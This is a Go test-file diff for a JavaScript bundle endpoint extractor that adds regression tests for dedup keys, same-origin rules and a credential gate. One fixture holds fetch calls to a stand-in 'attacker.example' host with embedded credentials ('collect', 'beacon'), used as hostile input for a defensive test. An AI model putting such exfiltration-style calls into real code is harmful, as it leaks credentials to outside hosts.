@@ -964,6 +964,22 @@ func TestConcatDedupKey_RootSlashPreserved(t *testing.T) {
 	if got := concatDedupKey("/", "example.com"); got != "example.com|/" {
 		t.Errorf("concatDedupKey(%q, %q) = %q, want %q", "/", "example.com", got, "example.com|/")
 	}
+
+	// TEST-002: the inner `trimmed != ""` guard was unreachable from either root
+	// test, so nothing pinned what a slashes-only path produces. "//" must key the
+	// same as "/" — the trailing-slash trim empties it and the guard restores the
+	// root form — otherwise a root-ish AST URL and a root-ish concat
+	// reconstruction would land in different buckets and the phantom-GET dedup
+	// would miss.
+	if got := concatDedupKey("//", "example.com"); got != "example.com|/" {
+		t.Errorf("concatDedupKey(%q, %q) = %q, want %q (must key as the root path)",
+			"//", "example.com", got, "example.com|/")
+	}
+	// Same for an absolute URL whose path is a bare root.
+	if got := concatDedupKey("https://example.com/", "example.com"); got != "example.com|/" {
+		t.Errorf("concatDedupKey(%q, %q) = %q, want %q",
+			"https://example.com/", "example.com", got, "example.com|/")
+	}
 }
 
 // QUAL-001: concatDedupKey must collapse a trailing-slash key onto its
@@ -974,5 +990,85 @@ func TestConcatDedupKey_TrailingSlashNormalized(t *testing.T) {
 	withoutSlash := concatDedupKey("/api/posts/{id}/comment", "example.com")
 	if withSlash != withoutSlash {
 		t.Errorf("concatDedupKey with trailing slash = %q, without = %q, want equal", withSlash, withoutSlash)
+	}
+}
+
+// TestExtractFromBundle_ASTAbsoluteCredentialGate is the regression guard for the
+// second-pass SEC-BE-001 finding: the first pass gated only the concat
+// reconstructions of ExtractFromBundle step 5, leaving the AST walkers of steps
+// 1, 3 and 4 emitting absolute URLs with embedded credentials.
+//
+// That mattered because classify Rule 7 floors EVERY IsJSStaticSource candidate
+// with an API-indicator path to the default --confidence, so such a candidate
+// reached OptionsProbe.probeURL — where ssrf.ValidateURL screens only scheme and
+// resolved IP, never u.User, and probe.Config.AuthHeaders is set by no non-test
+// caller — making net/http derive `Authorization: Basic <base64(userinfo)>` from
+// req.URL.User on every probe. rejectUnsafeAbsolute now applies
+// crawl.ValidateFullURL at the single choke point covering all producers.
+func TestExtractFromBundle_ASTAbsoluteCredentialGate(t *testing.T) {
+	src := []byte(`
+fetch("https://u:p@attacker.example/api/collect");
+fetch("https://token@attacker.example/api/beacon");
+axios.get("https://u:p@example.com/api/self");
+var tpl = fetch(` + "`https://u:p@example.com/api/${id}/tpl`" + `);
+`)
+	endpoints, err := ExtractFromBundle(src, "https://example.com/app.js")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+
+	// No producer may emit userinfo, whether the host is the bundle's own or not.
+	for _, ep := range endpoints {
+		if strings.Contains(ep.URL, "@") {
+			t.Errorf("endpoint with embedded credentials must NOT be emitted; got %q (source %q) in %v",
+				ep.URL, ep.SourceTag, endpoints)
+		}
+	}
+}
+
+// TestExtractFromBundle_CrossOriginASTLiteralRetained pins the asymmetry
+// rejectUnsafeAbsolute documents: the credential/scheme/host-validity gate applies
+// to every producer, but the stricter SAME-ORIGIN requirement stays concat-only.
+//
+// An AST literal is a real call site the bundle invokes, and a SPA calling
+// https://api.example.com from https://app.example.com is routine — gating those
+// on same-origin would be a large recall regression for the tool's primary use
+// case. A concat reconstruction is a speculative recombination, so a cross-origin
+// result there is far more likely an artifact or a plant.
+//
+// Without this test, a plausible "make the two gates symmetric" change would pass
+// the whole suite while silently dropping legitimate cross-origin API endpoints.
+func TestExtractFromBundle_CrossOriginASTLiteralRetained(t *testing.T) {
+	src := []byte(`
+fetch("https://api.example.com/api/orders");
+var cross = "https://api.example.com/api/".concat("reviews");
+`)
+	endpoints, err := ExtractFromBundle(src, "https://app.example.com/app.js")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+
+	if ep := findEndpoint(endpoints, "https://api.example.com/api/orders"); ep == nil {
+		t.Errorf("a clean cross-origin AST literal must STILL be emitted (recall): got %v", endpoints)
+	}
+	// The concat sibling for the same cross-origin host stays gated.
+	if ep := findEndpoint(endpoints, "https://api.example.com/api/reviews"); ep != nil {
+		t.Errorf("a cross-origin CONCAT reconstruction must remain dropped: got %v", endpoints)
+	}
+}
+
+// TestExtractFromBundle_ConcatDefaultPortSameOrigin pins QUAL-001: the concat
+// same-origin gate now uses crawl.SameOrigin, which canonicalizes default ports.
+// The previous ad hoc hostOfURL/schemeOfURL comparison dropped this
+// reconstruction because "example.com:443" != "example.com", even though
+// pkg/crawl's own probeMatchKey treats the two as one origin.
+func TestExtractFromBundle_ConcatDefaultPortSameOrigin(t *testing.T) {
+	src := []byte(`var u = "https://example.com:443/api/".concat("orders");`)
+	endpoints, err := ExtractFromBundle(src, "https://example.com/app.js")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ep := findEndpoint(endpoints, "https://example.com:443/api/orders"); ep == nil {
+		t.Errorf("explicit default port must count as same-origin as the bundle: got %v", endpoints)
 	}
 }
